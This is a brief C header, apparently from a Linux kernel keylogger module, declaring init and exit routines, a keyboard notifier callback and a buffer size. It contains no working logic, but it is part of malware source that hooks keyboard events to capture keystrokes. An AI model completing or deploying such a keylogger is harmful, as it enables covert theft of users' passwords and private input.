#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#define BUFFER_SIZE 0x1000

int init_keylogger(void);
void exit_keylogger(void);

int keylogger_notifier(struct notifier_block *, unsigned long, void *);

#endif
